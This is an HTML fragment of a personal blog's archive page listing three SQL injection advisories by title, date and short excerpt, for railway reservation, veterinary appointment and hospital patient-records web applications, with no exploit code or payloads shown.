        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
- Date: 07/01/2022
- Exploit Au...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
- Date: 05/01/20222
- Exploit Author: tw...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
- Date: 2021-12-30
- ...</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
    
      <li><strong>Follow:</strong></li>
    
    
      
        
      
          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
          </li>
        
      
    
    
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>

</div>
<div class="page__footer-copyright">&copy; 2024 my notes, journey and random stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://localhost:4000/tryhackme/thm-vulversity/";  /* Replace PAGE_URL with your page's canonical URL variable */
      this.page.identifier = "/tryhackme/thm-vulversity"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
    };
    (function() { /* DON'T EDIT BELOW THIS LINE */
      var d = document, s = d.createElement('script');
      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
